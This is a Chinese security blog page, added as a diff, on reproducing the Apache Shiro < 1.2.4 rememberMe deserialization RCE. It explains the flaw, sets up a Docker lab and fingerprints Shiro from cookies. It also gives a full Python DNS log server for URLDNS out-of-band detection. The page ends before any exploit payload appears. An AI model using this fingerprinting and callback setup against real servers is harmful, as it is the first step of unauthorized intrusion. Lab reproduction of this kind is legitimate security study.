@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="zh">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="White">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="White">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="0X00 漏洞原因：shiro提供的rememberMe功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。而其中对rememberMe的cookie做了加密处理，漏洞主要原因是加密的AES密钥是硬编码在文件中的，那么对于对称加密的AES加密算法我们已知密钥，并且IV为cookie进行base64解码后的前16个字节，因此我们可以构造任意的可控序列化pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Shiro &lt; 1.2.4 RCE 漏洞复现与利用">
+<meta property="og:url" content="https://wh1te.fun/2020/06/21/Apache%20Shiro%20%3C%201.2.4%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0X00 漏洞原因：shiro提供的rememberMe功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。而其中对rememberMe的cookie做了加密处理，漏洞主要原因是加密的AES密钥是硬编码在文件中的，那么对于对称加密的AES加密算法我们已知密钥，并且IV为cookie进行base64解码后的前16个字节，因此我们可以构造任意的可控序列化pa">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://photo-pool.oss-cn-hangzhou.aliyuncs.com/2020/06/21/15927247752893.jpg">
+<meta property="og:image" content="https://photo-pool.oss-cn-hangzhou.aliyuncs.com/2020/06/21/15927245338798.jpg">
+<meta property="article:published_time" content="2020-06-21T08:38:00.000Z">
+<meta property="article:modified_time" content="2020-06-23T07:32:10.498Z">
+<meta property="article:author" content="White">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://photo-pool.oss-cn-hangzhou.aliyuncs.com/2020/06/21/15927247752893.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Apache Shiro &lt; 1.2.4 RCE 漏洞复现与利用 · White&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >White&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Apache Shiro < 1.2.4 RCE 漏洞复现与利用</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>White's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Apache Shiro < 1.2.4 RCE 漏洞复现与利用
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.9k</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/06/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0X00-漏洞原因："><a href="#0X00-漏洞原因：" class="headerlink" title="0X00 漏洞原因："></a>0X00 漏洞原因：</h2><p>shiro提供的rememberMe功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。而其中对rememberMe的cookie做了加密处理，漏洞主要原因是加密的AES密钥是硬编码在文件中的，那么对于对称加密的AES加密算法我们已知密钥，并且IV为cookie进行base64解码后的前16个字节，因此我们可以构造任意的可控序列化payload</p>
+<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p>
+<p><code>得到rememberMe的cookie值--&gt;Base64解码--&gt;AES解密--&gt;反序列化</code></p>
+<h2 id="0X01-漏洞环境搭建"><a href="#0X01-漏洞环境搭建" class="headerlink" title="0X01 漏洞环境搭建"></a>0X01 漏洞环境搭建</h2><h4 id="下载docker镜像"><a href="#下载docker镜像" class="headerlink" title="下载docker镜像"></a>下载docker镜像</h4><p> docker pull medicean/vulapps:s_shiro_1</p>
+<h4 id="启动docker镜像"><a href="#启动docker镜像" class="headerlink" title="启动docker镜像"></a>启动docker镜像</h4><p>docker run -d -p 9000:8080 medicean/vulapps:s_shiro_1</p>
+<h4 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h4><p><a href="http://localhost:9000/" target="_blank" rel="noopener">http://localhost:9000/</a> 环境搭建成功</p>
+<h2 id="0X02、如何识别shiro"><a href="#0X02、如何识别shiro" class="headerlink" title="0X02、如何识别shiro"></a>0X02、如何识别shiro</h2><p>在cookie中添加rememberMe=1，如果响应头中存在deleteME=1,则使用了shiro<br><img src="https://photo-pool.oss-cn-hangzhou.aliyuncs.com/2020/06/21/15927247752893.jpg" alt="-w1131"></p>
+<h2 id="0x03-如何检测是否存在shiro漏洞"><a href="#0x03-如何检测是否存在shiro漏洞" class="headerlink" title="0x03 如何检测是否存在shiro漏洞"></a>0x03 如何检测是否存在shiro漏洞</h2><p>一种较为简单的检测方式就是Ysoserial的URLDN + DNSLog</p>
+<p>DNSlog可以使用<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 提供的dnslog服务<br>也可以自行搭建dnslog服务</p>
+<h4 id="如何搭建dnslog服务"><a href="#如何搭建dnslog服务" class="headerlink" title="如何搭建dnslog服务"></a>如何搭建dnslog服务</h4><p>首先需要一个域名，添加两条域名解析<br>这里以域名为shiro.com，服务器ip为6.6.6.6为例<br>dns    NS    默认    ns.shiro.com<br>ns      A    默认    6.6.6.6</p>
+<p>然后在服务器上执行<code>python3 dnslog.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socketserver <span class="keyword">as</span> SocketServer</span><br><span class="line"></span><br><span class="line">dns_domain = <span class="string">"dns.shiro.fun"</span> <span class="comment">#配置的DNS域名</span></span><br><span class="line">ip_address = <span class="string">"127.0.0.1"</span>        <span class="comment">#当请求域名为dns_domain时候解析的Ip</span></span><br><span class="line">default_ip = <span class="string">'127.0.0.1'</span>        <span class="comment">#默认解析ip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">current_time</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="string">'[%Y.%m.%d %H:%M:%S]'</span>, time.localtime())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SinDNSQuery</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        self.name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            d = data[i]</span><br><span class="line">            <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">32</span>:</span><br><span class="line">                self.name += <span class="string">'.'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.name += chr(d)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.querybytes = data[<span class="number">0</span>:i + <span class="number">1</span>]</span><br><span class="line">        self.type, self.classify = struct.unpack(<span class="string">'&gt;HH'</span>, data[i + <span class="number">1</span>:i + <span class="number">5</span>])</span><br><span class="line">        self.len = i + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbytes</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.querybytes + struct.pack(<span class="string">'&gt;HH'</span>, self.type, self.classify)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SinDNSAnswer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">        self.type = <span class="number">1</span></span><br><span class="line">        self.classify = <span class="number">1</span></span><br><span class="line">        self.name = <span class="number">49164</span></span><br><span class="line">        self.datalength = <span class="number">4</span></span><br><span class="line">        self.timetolive = <span class="number">190</span></span><br><span class="line">        self.ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbytes</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = struct.pack(<span class="string">'&gt;HHHLH'</span>, self.name, self.type, self.classify, self.timetolive, self.datalength)</span><br><span class="line">        s = self.ip.split(<span class="string">'.'</span>)</span><br><span class="line">        res += struct.pack(<span class="string">'BBBB'</span>, int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>]), int(s[<span class="number">3</span>]))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SinDNSFrame</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        (self.id, self.flags, self.quests, self.answers, self.author, self.addition) = struct.unpack(<span class="string">'&gt;HHHHHH'</span>, data[<span class="number">0</span>:<span class="number">12</span>])</span><br><span class="line">        self.query = SinDNSQuery(data[<span class="number">12</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getname</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.query.name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setip</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">        self.answer = SinDNSAnswer(ip)</span><br><span class="line">        self.answers = <span class="number">1</span></span><br><span class="line">        self.flags = <span class="number">33152</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbytes</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = struct.pack(<span class="string">'&gt;HHHHHH'</span>, self.id, self.flags, self.quests, self.answers, self.author, self.addition)</span><br><span class="line">        res = res + self.query.getbytes()</span><br><span class="line">        <span class="keyword">if</span> self.answers != <span class="number">0</span>:</span><br><span class="line">            res += self.answer.getbytes()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DnsRequestHandler</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> ip_address, dns_domain, default_ip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.request[<span class="number">0</span>].strip()</span><br><span class="line">        dns = SinDNSFrame(data)</span><br><span class="line">        conn = self.request[<span class="number">1</span>]</span><br><span class="line">        query_host = dns.getname()</span><br><span class="line">        print(query_host)</span><br><span class="line">        <span class="comment"># A record</span></span><br><span class="line">        <span class="keyword">if</span> dns.query.type == <span class="number">1</span>:</span><br><span class="line">            response = ip_address <span class="keyword">if</span> query_host.endswith(dns_domain) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> response:</span><br><span class="line">                dns.setip(response)</span><br><span class="line">                log_format = &#123;<span class="string">'client_ip'</span>: self.client_address[<span class="number">0</span>], <span class="string">'client_port'</span>: self.client_address[<span class="number">1</span>],</span><br><span class="line">                              <span class="string">'query_host'</span>: query_host, <span class="string">'record_type'</span>: <span class="string">'A'</span>&#125;</span><br><span class="line">                conn.sendto(dns.getbytes(), self.client_address)</span><br><span class="line">                print(<span class="string">'&#123;&#125; &#123;&#125;'</span>.format(current_time(), log_format))</span><br><span class="line">                user_domamin = re.search(<span class="string">r'\.?([^\.]+)\.%s'</span> % dns_domain, query_host)</span><br><span class="line">                print(<span class="string">"Receive new DNS Query:"</span>+query_host)</span><br><span class="line">                qtime = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime(time.time()))</span><br><span class="line">                <span class="comment">#save_dns_record(query_host,qtime,self.client_address[0])</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dns.setip(default_ip)</span><br><span class="line">                conn.sendto(dns.getbytes(), self.client_address)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># AAAA record</span></span><br><span class="line">        <span class="keyword">elif</span> dns.query.type == <span class="number">28</span>:</span><br><span class="line">            response = ip_address <span class="keyword">if</span> query_host.endswith(dns_domain) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> response:</span><br><span class="line">                dns.setip(response)</span><br><span class="line">                conn.sendto(dns.getbytes(), self.client_address)</span><br><span class="line">                log_format = &#123;<span class="string">'client_ip'</span>: self.client_address[<span class="number">0</span>], <span class="string">'client_port'</span>: self.client_address[<span class="number">1</span>],</span><br><span class="line">                              <span class="string">'query_host'</span>: query_host, <span class="string">'record_type'</span>: <span class="string">'AAAA'</span>&#125;</span><br><span class="line">                print(<span class="string">'&#123;&#125; &#123;&#125;'</span>.format(current_time(), log_format))</span><br><span class="line">                user_domamin = re.search(<span class="string">r'\.?([^\.]+)\.%s'</span> % dns_domain, query_host)</span><br><span class="line">                print(<span class="string">"Receive new DNS Query:"</span>+query_host)</span><br><span class="line">                <span class="comment">#save_dns_record(query_host,qtime,self.client_address[0])</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dns.setip(default_ip)</span><br><span class="line">                conn.sendto(dns.getbytes(), self.client_address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dns.setip(default_ip)</span><br><span class="line">            conn.sendto(dns.getbytes(), self.client_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleDnsServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, port=<span class="number">53</span>)</span>:</span></span><br><span class="line">        self.port = port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.dns_udp_server = SocketServer.UDPServer((<span class="string">"0.0.0.0"</span>, self.port), DnsRequestHandler)</span><br><span class="line">        print(<span class="string">"&#123;&#125; Dnslog server start"</span>.format(current_time()))</span><br><span class="line">        self.dns_udp_server.serve_forever()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.dns_udp_server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dns_server = SimpleDnsServer()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dns_server.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"DNS Server Error with:"</span>+str(e))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"start success"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dns_server.stop()</span><br><span class="line">        print(<span class="string">"stop success"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"DNS Server Error with:"</span>+str(e))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"stop success"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start()</span><br></pre></td></tr></table></figure>
+
+<p>然后本地执行<code>ping dnslogtest.dns.shiro.com</code><br>查看vps是否产生dns解析,有即为配置成果</p>
